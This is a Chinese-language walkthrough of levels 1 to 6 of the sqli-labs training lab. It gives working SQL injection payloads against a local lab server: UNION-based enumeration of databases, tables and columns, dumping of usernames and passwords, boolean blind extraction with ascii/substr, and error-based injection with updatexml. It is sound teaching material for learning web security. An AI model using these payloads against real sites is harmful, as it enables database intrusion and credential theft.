# sqli-lab通关笔记

## Less-1--基于单引号的字符型注入

## 配置信息

​	在Lsee-1目录下的index.php中配置

```
echo $sql;
echo "<br>";
```

用于在网页显示sql语句

### 初始界面

![](https://gitee.com/xxb667/img/raw/master/img/image-20211210163737959.png)

上面提示：

Please input the ID as parameter with numeric value

意思是我们应该输入一个ID信息

### 输入ID后的界面

1. 首先，按F12--【hackbar】

2. 然后，Load加载网页地址到URL上

3. 在URL上输入【 ?id=1】

4. 然后点击【EXECUTE】按钮

5. 结果如下所示，

6. 成功登录，显示数据库中id=1的信息

   ![image-20211210170337545](https://gitee.com/xxb667/img/raw/master/img/image-20211210170337545.png)

### 注意

输入ID值，可以依次查看数据库中ID信息

### 判断是否有漏洞法1

在ID值后面加上单引号 【'】，即可判断是否有漏洞

情况如下所示

判断出有SQL语句错误，说明有SQL漏洞

![image-20211210191612943](https://gitee.com/xxb667/img/raw/master/img/image-20211210191612943.png)

#### 测试

```
http://192.168.81.135/sqli/Less-1/?id=1' or 1=1 --+
```

显示正确结果

注意

--+：结束符

--：注释符

#：注释符

数据库中的查询语句为

```
select * from users where id='1' or 1=1--' limit 0,1;
```

其中

limit 0,1：

​	0：表示从0位置开始，

​	1：为步长，表示几个

![image-20211210193431229](https://gitee.com/xxb667/img/raw/master/img/image-20211210193431229.png)

### 判断漏洞法2

- 首先注入语句

  ```
  ?id=1' and 1=1--+
  ```

  正常登录不报错

  ![image-20211210194326860](https://gitee.com/xxb667/img/raw/master/img/image-20211210194326860.png)

- 然后把1=1改为1=2

  ```
  ?id=1' and 1=2--+
  ```

  不显示任何信息（说明有注入漏洞）

  ![image-20211210194433873](https://gitee.com/xxb667/img/raw/master/img/image-20211210194433873.png)

### 注入字符判断列数

#### 注：

- 超出列数会报错

- 二分查找试出列出

  - 经实验列数为3

  - ```
    http://192.168.81.135/sqli/Less-1/?id=1' order by 3 --+
    ```

    

![image-20211210194656714](https://gitee.com/xxb667/img/raw/master/img/image-20211210194656714.png)

![image-20211210194809388](https://gitee.com/xxb667/img/raw/master/img/image-20211210194809388.png)

### 判断数据显示点

#### 注

ID一定要改为0或其他非正整数即可（x也可以）

```
http://192.168.81.135/sqli/Less-1/?id=0' union select 1,2,3 --+
```

![image-20211210195031504](https://gitee.com/xxb667/img/raw/master/img/image-20211210195031504.png)

### 注入字符后加sql注入基本语句

#### 查看当前数据库

```
http://192.168.81.135/sqli/Less-1/?id=0' union select 1,2,database() --+
```

![image-20211210195301761](https://gitee.com/xxb667/img/raw/master/img/image-20211210195301761.png)

#### 根据数字位置查看数据库

```
http://192.168.81.135/sqli/Less-1/?id=0' union select 1,2,schema_name from information_schema.schemata limit 0,1 --+
```

改变0的数字大小即可查看对应数据库中名字

![image-20211210195940179](https://gitee.com/xxb667/img/raw/master/img/image-20211210195940179.png)

![image-20211210200009304](https://gitee.com/xxb667/img/raw/master/img/image-20211210200009304.png)

#### 查看所有数据库

```
http://192.168.81.135/sqli/Less-1/?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

group_concat()：从分组后的字段中选出函数内的字段值

![image-20211210201058070](https://gitee.com/xxb667/img/raw/master/img/image-20211210201058070.png)

#### 查表

```
http://192.168.81.135/sqli/Less-1/?id=0' union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1--+
```

0x7365637572697479：security的16进制

limit后面的数字

改变0的数字即可查看security数据库中的表

![image-20211210201724638](https://gitee.com/xxb667/img/raw/master/img/image-20211210201724638.png)

![image-20211210201734926](https://gitee.com/xxb667/img/raw/master/img/image-20211210201734926.png)

#### 查看所有表

```
http://192.168.81.135/sqli/Less-1/?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+
```

![image-20211210201930965](https://gitee.com/xxb667/img/raw/master/img/image-20211210201930965.png)

#### 查询列信息

其中table_name=0x75736572

0x75736572：16进制的users

```
http://192.168.81.135/sqli/Less-1/?id=-1' union select 1,2,column_name from information_schema.columns where table_name=0x75736572 --+
```

![image-20211211132916786](https://gitee.com/xxb667/img/raw/master/img/image-20211211132916786.png)

#### 查看所有列信息

```
http://192.168.81.135/sqli/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x75736572 --+
```

所有列信息在1行显示

![image-20211211133116108](https://gitee.com/xxb667/img/raw/master/img/image-20211211133116108.png)

#### 查询一个账号和密码

```
http://192.168.81.135/sqli/Less-1/?id=-1' union select 1,2,concat_ws('~',username,password) from security.users limit 1,1 --+
```

通过改变limit后面第1个【1】，可以查看数据库中的账号和密码

![image-20211211133629386](https://gitee.com/xxb667/img/raw/master/img/image-20211211133629386.png)

#### 直接获得所有账户和密码

```
http://192.168.81.135/sqli/Less-1/?id=-1' union select 1,2,group_concat(concat_ws('0x7e',username,password)) from security.users --+
```

![image-20211211133850402](https://gitee.com/xxb667/img/raw/master/img/image-20211211133850402.png)

### 注意

以上所有操作均可在MySQL数据库中进行，

数据库代码可以查看黄体字所示

## Less-2--布尔型注入

同Less-1加入配置信息后，可以显示sql语句

验证

### id值的不同

可以看到sql语句中的

id=1

而在Less-1中的id值为：id="1"

```
http://192.168.81.135/sqli/Less-2/?id=1--+
```

![image-20211211105212782](https://gitee.com/xxb667/img/raw/master/img/image-20211211105212782.png)

由上面可知，我们不需要在id值后加入单引号首先，注入语句

```
http://192.168.81.135/sqli/Less-2/?id=1 and 1=1 --+
```

正常显示

![image-20211211100015250](https://gitee.com/xxb667/img/raw/master/img/image-20211211100015250.png)



当把1=1改为1=2时，不显示内容也不提示错误

```
http://192.168.81.135/sqli/Less-2/?id=1 and 1=2 --+
```

![image-20211211100151201](https://gitee.com/xxb667/img/raw/master/img/image-20211211100151201.png)

### 查看是否有注入

```
http://192.168.81.135/sqli/Less-2/?id=-1'--+
```

可以看到有注入

![image-20211211101658452](https://gitee.com/xxb667/img/raw/master/img/image-20211211101658452.png)

其他操作请参考Less-1中的内容

### 查看所有数据库

```
http://192.168.81.135/sqli/Less-2/?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+
```

![image-20211211134331625](https://gitee.com/xxb667/img/raw/master/img/image-20211211134331625.png)

### 查看所有表

```
http://192.168.81.135/sqli/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+
```

table_schema=0x7365637572697479

后面为security的16进制

![image-20211211134651449](https://gitee.com/xxb667/img/raw/master/img/image-20211211134651449.png)

### 查看所有列信息

```
http://192.168.81.135/sqli/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
```

table_name=0x7573657273

table_name后面为表名users的16进制

![image-20211211135044409](https://gitee.com/xxb667/img/raw/master/img/image-20211211135044409.png)

### 查看账号和密码

```
http://192.168.81.135/sqli/Less-2/?id=-1 union select 1,2,concat_ws(0x7e,username,password) from security.users--+
```

![image-20211211103026536](https://gitee.com/xxb667/img/raw/master/img/image-20211211103026536.png)



### 获得所有账号和密码

获得账号和密码后，使用~符号进行分隔

这段代码是前面代码的复合形式

```
http://192.168.81.135/sqli/Less-2/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+
```

![image-20211211102213867](https://gitee.com/xxb667/img/raw/master/img/image-20211211102213867.png)

## Less-3--基于【')】的字符型注入

配置信息同上

### 查看id值信息

id=（‘1’）

```
http://192.168.81.135/sqli/Less-3/?id=1 --+
```

![image-20211211105923643](https://gitee.com/xxb667/img/raw/master/img/image-20211211105923643.png)

### 注入语句

```
http://192.168.81.135/sqli/Less-3/?id=1')  and 1=1--+
```

不报错，正常显示

![image-20211211110119755](https://gitee.com/xxb667/img/raw/master/img/image-20211211110119755.png)

### 查询数据参考

其他查看数据库内容方法参考Less-1和Less-2

#### 查看所有数据库

通过改变Id值来依次查看数据库

```
http://192.168.81.135/sqli/Less-3/?id=1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

![image-20211211110855871](https://gitee.com/xxb667/img/raw/master/img/image-20211211110855871.png)

#### 查看所有表

```
http://192.168.81.135/sqli/Less-3/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+
```

![image-20211211140911003](https://gitee.com/xxb667/img/raw/master/img/image-20211211140911003.png)

#### 查看所有列信息

```
http://192.168.81.135/sqli/Less-3/?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
```

![image-20211211141155731](https://gitee.com/xxb667/img/raw/master/img/image-20211211141155731.png)

#### 得到所有账号和密码

```
http://192.168.81.135/sqli/Less-3/?id=-1') union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+
```

![image-20211211141340852](https://gitee.com/xxb667/img/raw/master/img/image-20211211141340852.png)

## Less-4--基于【")】字符型注入

配置同上

### 查看id信息

可以看出id值为

id=("1")

```
http://192.168.81.135/sqli/Less-4/?id=1--+
```

![image-20211211111340136](https://gitee.com/xxb667/img/raw/master/img/image-20211211111340136.png)

### 注入语句

```
http://192.168.81.135/sqli/Less-4/?id=1") and 1=1--+
```

正常显示

![image-20211211111623953](https://gitee.com/xxb667/img/raw/master/img/image-20211211111623953.png)

查看相关信息同上

### 举例查看

#### 查看所有列信息

改变id值可依次查看数据库中信息

```
http://192.168.81.135/sqli/Less-4/?id=1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
```

![image-20211211112315611](https://gitee.com/xxb667/img/raw/master/img/image-20211211112315611.png)

#### 查看所有数据库

```
http://192.168.81.135/sqli/Less-4/?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata --+
```

![image-20211211141621011](https://gitee.com/xxb667/img/raw/master/img/image-20211211141621011.png)

#### 查看所有表

```
http://192.168.81.135/sqli/Less-4/?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+
```

![image-20211211141828910](https://gitee.com/xxb667/img/raw/master/img/image-20211211141828910.png)

#### 查看所有列信息

```
http://192.168.81.135/sqli/Less-4/?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
```

![image-20211211141949860](https://gitee.com/xxb667/img/raw/master/img/image-20211211141949860.png)

#### 查看所有账户和密码

```
http://192.168.81.135/sqli/Less-4/?id=-1") union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+
```

![image-20211211142257404](https://gitee.com/xxb667/img/raw/master/img/image-20211211142257404.png)

## Less-5--基于【'】字符型的错误回显注入

### 查看id信息

和Less-4类似

```
http://192.168.81.135/sqli/Less-4/?id=1--+
```

![image-20211211144121859](https://gitee.com/xxb667/img/raw/master/img/image-20211211144121859.png)

### 判断数据库第1位是否位【s】

```
http://192.168.81.135/sqli/Less-5/?id=1' and left((select database()),1)='s' --+
```

结果显示：You are in... 表示是正确的

若出错不显示

![image-20211211144524603](https://gitee.com/xxb667/img/raw/master/img/image-20211211144524603.png)

### 试出数据库中第1位的ascii码

```
http://192.168.81.135/sqli/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) > 1 --+
```

通过改变 大于号后面1的参数大小进行实验

当等于一个数字时，则表明这个数字对应的ascii就是对应数据库中的名

![image-20211211145954441](https://gitee.com/xxb667/img/raw/master/img/image-20211211145954441.png)

未显示结果，然后使用二分法试出结果

![image-20211211150104314](https://gitee.com/xxb667/img/raw/master/img/image-20211211150104314.png)

```
http://192.168.81.135/sqli/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) =98--+
```

结果为98

![image-20211211150255530](https://gitee.com/xxb667/img/raw/master/img/image-20211211150255530.png)

### 通过二分法猜解security中的表

```
http://192.168.81.135/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1)) >1--+
```

![image-20211211150635878](https://gitee.com/xxb667/img/raw/master/img/image-20211211150635878.png)

```
http://192.168.81.135/sqli/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1)) =114--+
```

![image-20211211150909641](https://gitee.com/xxb667/img/raw/master/img/image-20211211150909641.png)

### 二分法猜解users内的字段

```
http://192.168.81.135/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) >1--+
```

![image-20211211151124826](https://gitee.com/xxb667/img/raw/master/img/image-20211211151124826.png)

```
http://192.168.81.135/sqli/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),1,1)) =117--+
```

![image-20211211151222913](https://gitee.com/xxb667/img/raw/master/img/image-20211211151222913.png)

### 注

本次猜解只是猜解了第1个字母的ascii

## Less-6--基于【"】字符型的错误回显注入

### 查看Id信息

id=“1”

```
http://192.168.81.135/sqli/Less-6/?id=1
```

![image-20211214094626060](https://gitee.com/xxb667/img/raw/master/img/image-20211214094626060.png)

### 通过二分法猜解库

```
http://192.168.81.135/sqli/Less-6/?id=1" and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) >1 --+
```

![image-20211214095135220](https://gitee.com/xxb667/img/raw/master/img/image-20211214095135220.png)

结果为98

```
http://192.168.81.135/sqli/Less-6/?id=1" and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) =98 --+
```

![image-20211214095304078](https://gitee.com/xxb667/img/raw/master/img/image-20211214095304078.png)

### 二分法猜解得到security下的表

```
http://192.168.81.135/sqli/Less-6/?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1)) >1 --+
```

![image-20211214095801785](https://gitee.com/xxb667/img/raw/master/img/image-20211214095801785.png)

结果为114

```
http://192.168.81.135/sqli/Less-6/?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1)) =114 --+
```

![image-20211214095916103](https://gitee.com/xxb667/img/raw/master/img/image-20211214095916103.png)

### 返回用户名

```
http://192.168.81.135/sqli/Less-6/?id=1" union select updatexml(1,concat(0x7e,(select user()),0x7e),1) --+
```

![image-20211214100127375](https://gitee.com/xxb667/img/raw/master/img/image-20211214100127375.png)

